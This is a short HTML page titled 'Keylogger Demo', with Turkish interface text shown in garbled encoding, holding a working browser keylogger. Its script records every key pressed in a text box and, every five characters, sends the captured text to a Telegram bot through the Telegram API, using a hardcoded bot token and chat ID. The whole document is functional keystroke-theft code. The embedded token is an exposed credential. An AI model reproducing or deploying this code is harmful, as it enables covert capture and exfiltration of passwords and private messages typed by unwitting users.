<body>
  <h2>Keylogger Demo</h2>
  <textarea id="input" rows="10" cols="60" placeholder="Yazmaya ba≈üla..."></textarea>

  <script>
    const TELEGRAM_BOT_TOKEN = '7740489037:AAHgOz-DbTeXM-IqY9luQNPL4uao1kWrudU';
    const TELEGRAM_CHAT_ID = '5395609882';

    let logBuffer = '';

    function sendToTelegram(message) {
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        })
      })
      .then(res => res.json())
      .then(data => console.log('Telegram g√∂nderildi:', data))
      .catch(err => console.error('G√∂nderim hatasƒ±:', err));
    }

    document.getElementById('input').addEventListener('keydown', (e) => {
      logBuffer += e.key;
      if (logBuffer.length >= 5) {
        sendToTelegram('üñäÔ∏è Yeni giri≈ü: ' + logBuffer);
        logBuffer = '';
      }
    });
  </script>
</body>
